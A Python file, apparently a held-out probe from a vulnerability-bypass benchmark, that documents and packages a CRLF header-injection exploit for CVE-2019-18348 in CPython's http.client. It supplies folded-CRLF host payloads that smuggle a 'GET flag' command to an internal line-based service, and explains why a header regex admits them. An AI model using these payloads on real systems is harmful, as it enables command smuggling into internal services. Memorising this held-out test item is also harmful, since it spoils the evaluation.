#!/usr/bin/env python3
"""[HELD-OUT] CVE-2019-18348 residual exploit -- the incomplete-fix bypass of the
CVE-2019-9740 path fix in CPython stdlib http.client.

The CVE-2019-9740 fix (python 3.7.4+) added `_validate_path(url)` to `putrequest`,
rejecting CR/LF in the request PATH. It did NOT validate the HOST component. So a
CRLF placed in the host of the URL (the netloc that reaches
`http.client.HTTPConnection(host)`) still reaches the wire.

Payload (host component):

    host = "127.0.0.1\\r\\n GET flag"

The CRLF is written as an obs-fold continuation (CRLF followed by a space), which is
why it survives the pre-existing `putheader` value check
`_is_illegal_header_value = re.compile(rb'\\n(?![ \\t])|\\r(?![ \\t\\n])')` -- that
regex rejects a bare CRLF but explicitly allows a CRLF that is folded with a leading
space/tab. So `putrequest` emits:

    Host: 127.0.0.1\\r\\n GET flag\\r\\n

and the folded line ` GET flag` reaches the internal line-based flag listener, which
(tolerating leading whitespace, exactly as Redis-style inline command parsing does)
executes `GET flag` and returns ${PCB_FLAG}. This mirrors the real CVE-2019-18348
impact: smuggling inline commands to internal line-based services (Redis SLAVEOF,
memcached, ...) via a CRLF in the URL host.

  V1 python 3.7.7  -- HOST unvalidated -> folded ` GET flag` reaches canary -> FLAG (residual OPEN).
  V2 python 3.7.8  -- HTTPConnection.__init__ calls `_validate_host(self.host)`, whose regex
                      `_contains_disallowed_url_pchar_re = [\\x00-\\x20\\x7f]` matches the CR/LF (and
                      the space) and raises `InvalidURL` at construction -> BLOCKED.
"""

# One primary vector plus obvious variations, so the held-out probe is robust.
VECTORS = [
    "127.0.0.1\r\n GET flag",     # CRLF + space (obs-fold)
    "127.0.0.1\r\n\tGET flag",    # CRLF + tab (obs-fold)
]


def candidate(host=None):
    return {
        "id": "cve-2019-18348-host-crlf",
        "mode": "bypass",
        "host": host if host is not None else VECTORS[0],
        "path": "/",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
